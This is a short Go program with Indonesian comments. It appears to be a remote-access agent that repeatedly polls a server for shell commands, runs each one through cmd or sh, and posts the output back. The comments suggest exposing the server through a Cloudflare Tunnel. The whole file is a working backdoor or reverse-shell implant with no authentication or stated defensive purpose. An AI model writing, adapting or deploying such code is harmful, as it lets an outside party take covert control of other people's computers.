package main

import (
	"bytes"
	"io"
	"net/http"
	"os/exec"
	"runtime"
	"time"
)

// Ganti URL ini dengan URL Cloudflare Tunnel Anda nantinya
// Contoh: "https://random-words.trycloudflare.com"
const senderURL = "http://localhost:8080" 

func main() {
	for {
		// 1. Polling: Minta perintah dari Sender
		resp, err := http.Get(senderURL + "/poll")
		if err != nil {
			// Jika server mati/tidak terjangkau, tunggu dan coba lagi
			time.Sleep(3 * time.Second)
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		cmdStr := string(body)

		// 2. Eksekusi: Jika ada perintah masuk
		if cmdStr != "" {
			var cmd *exec.Cmd
			
			// Deteksi OS untuk shell yang digunakan
			if runtime.GOOS == "windows" {
				cmd = exec.Command("cmd", "/c", cmdStr)
			} else {
				cmd = exec.Command("sh", "-c", cmdStr)
			}

			// Ambil output standar dan error standar
			out, err := cmd.CombinedOutput()
			res := string(out)
			
			if err != nil {
				res += "\n[!] Error: " + err.Error()
			}
			if res == "" {
				res = "[*] Command executed successfully (no output)."
			}

			// 3. Callback: Kirim hasil eksekusi ke Sender
			http.Post(senderURL+"/result", "text/plain", bytes.NewBufferString(res))
		}

		// Jeda antar-polling agar tidak membebani CPU dan Network
		time.Sleep(1 * time.Second)
	}
}
